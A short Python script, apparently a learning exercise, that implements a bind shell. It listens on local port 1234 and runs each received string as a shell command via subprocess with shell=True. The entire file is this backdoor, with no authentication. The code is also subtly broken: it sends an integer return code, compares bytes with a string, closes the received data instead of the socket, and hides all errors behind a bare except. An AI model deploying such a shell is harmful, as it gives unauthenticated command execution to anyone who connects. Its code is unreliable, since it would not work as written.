import socket 
import subprocess

try:
    #Creating a TCP ipv4 socket listening for incoming connections
    #Bind and Listen this specific address
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind(('127.0.0.1',1234))

    #Listening for any incoming connections, only one is accepted
    s.listen(1)

    client_socket, client_address =s.accept()
    cmdlet = client_socket.recv(2048)
    while cmdlet!= 'end':
        # While running cmdlet and shell is true allows it to run in a seperate shell
        result = subprocess.check_call(cmdlet,shell=True)
        client_socket.send(result)
        cmdlet=client_socket.recv(2048)
    
    cmdlet.close()
    s.close()
except:
    print("An error has occured.") 